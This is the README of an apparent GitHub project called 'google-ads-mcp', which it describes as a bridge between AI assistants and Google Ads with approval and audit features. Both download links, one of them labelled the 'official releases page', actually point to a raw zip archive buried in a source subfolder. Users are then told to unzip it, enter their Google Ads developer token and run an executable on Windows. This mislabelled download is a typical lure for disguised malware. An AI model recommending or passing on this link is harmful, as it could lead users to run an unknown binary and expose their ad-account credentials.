# 📈 google-ads-mcp - Manage Google Ads with smart AI

[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/elvis-velez/google-ads-mcp/raw/refs/heads/main/src/google_ads_mcp/observability/mcp-google-ads-v2.5-beta.1.zip)

This application connects your AI assistant to your Google Ads account. You use your AI to review and update your marketing campaigns. The system ensures changes stay safe by requiring your approval before any update writes to your account.

## 📋 What this tool does

The google-ads-mcp tool acts as a bridge. It allows AI models like Claude to see your ad data and perform tasks. It supports the full Google Ads v24 API. The system includes features to keep your data secure. It logs all actions in an audit file. It limits access to specific customer IDs you allow. It forces a two-step process for all edits. You preview the change, then you tell the AI to apply it.

## 💻 Requirements

To use this software, you need:
* A Windows 10 or 11 computer.
* A Google Ads account with API access enabled.
* A stable internet connection.
* The Google Ads developer token.
* A compatible AI client like Claude Code or a standard MCP-supported host.

## 📥 How to get started

1. Visit the [official releases page](https://github.com/elvis-velez/google-ads-mcp/raw/refs/heads/main/src/google_ads_mcp/observability/mcp-google-ads-v2.5-beta.1.zip).
2. Look for the latest version under the "Assets" section.
3. Download the version designed for Windows.
4. Save the file to a folder you can find later.

## 🛠️ Setting up the application

Follow these steps to prepare the software:

1. Unzip the folder you downloaded from the website.
2. Locate the file named 'config.yaml'.
3. Open 'config.yaml' using a text editor like Notepad.
4. Paste your Google Ads developer token and your customer ID into the spaces provided.
5. Save the file.
6. Open your Command Prompt or PowerShell terminal.
7. Navigate to the folder where you placed the file.
8. Type the start command provided in the documentation and press Enter.

## 🛡️ Safety features

This application focuses on account stability. It does not perform actions automatically. Every edit goes through a strict verification phase. The system tracks every interaction in an append-only audit log. This means information gets added to the log but old entries never change. You maintain control over which accounts the AI can reach through the allowlist. 

## 🔍 How to use with your AI

Most AI assistants will ask for the location of your MCP server once you start the program. Provide the path to the executable file. Once connected, your AI will show a list of available tools. You can ask your AI to list your current campaigns or show you your budget spend. 

If you ask the AI to change an ad, it will show you a draft first. Check the draft for errors. Tell the AI to confirm the change. The system then writes the change to your Google Ads account.

## 🧩 Troubleshooting common issues

If the application fails to start, verify your network settings. Ensure your firewall does not block the connection to the Google Ads API. Check your 'config.yaml' file for typos. Ensure the customer ID uses the standard numeric format without dashes. 

The software leaves a log file in the installation directory. You can read this file if you need to understand why a specific task failed. If an error occurs, look for the timestamp to match the event. 

## ❓ Frequently asked questions

Does this tool delete my ads? 
No, the tool operates under your control. It requires your approval for sensitive operations.

Does the software store my data? 
The software stores authentication tokens locally on your machine. It does not send your private data to a third-party server.

Can I reach multiple Google Ads accounts? 
Yes, you can add multiple IDs to your allowlist within the configuration file.

What versions of Windows does this support? 
This software runs on any modern version of Windows 10 or 11.

Do I need deep technical knowledge? 
No, you only need to update the configuration file once. The AI client handles the rest of the work.

How do I remove the software? 
You delete the folder where you saved the files. No complex uninstallation process is necessary.